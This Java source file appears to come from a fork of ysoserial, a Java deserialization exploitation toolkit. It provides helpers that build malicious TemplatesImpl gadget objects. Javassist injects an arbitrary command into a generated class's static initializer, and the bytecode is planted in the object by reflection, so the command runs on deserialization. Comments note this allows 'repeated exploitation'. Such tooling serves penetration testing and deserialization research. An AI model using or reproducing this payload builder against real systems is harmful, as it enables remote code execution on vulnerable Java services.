package ysoserial.blind;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import ysoserial.payloads.util.ClassFiles;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

/**
 * Utilities for building Javassist payloads
 *
 * Created by dusanklinec on 18.09.16.
 */
public class GadgetUtils {
    public static <T> CtClass initClassImpl ( Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory ) throws Exception {
        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(Gadgets.StubTransletPayload.class.getName());

        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        return clazz;
    }

    public static Object createTemplatesImpl ( final Object command ) throws Exception {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            return createTemplatesImpl(
                    command,
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }

    public static <T> T createTemplatesImpl ( final Object command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory ) throws Exception {
        final T templates = tplClass.newInstance();

        byte[] classBytes = null;
        if (command instanceof String){
            final CtClass clazz = initClassImpl(tplClass, abstTranslet, transFactory);
            // run command in static initializer
            clazz.makeClassInitializer().insertAfter((String)command);
            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
            classBytes = clazz.toBytecode();

        } else if (command instanceof CtClass){
            // use template gadget class
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class));
            pool.insertClassPath(new ClassClassPath(abstTranslet));
            final CtClass clazz = (CtClass) command;

            // Just to be sure its set correctly.
            CtClass superC = pool.get(abstTranslet.getName());
            clazz.setSuperclass(superC);

            classBytes = clazz.toBytecode();

        } else if (command instanceof byte[]){
            classBytes = (byte[]) command;
        }

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes, ClassFiles.classAsBytes(Gadgets.Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }
}
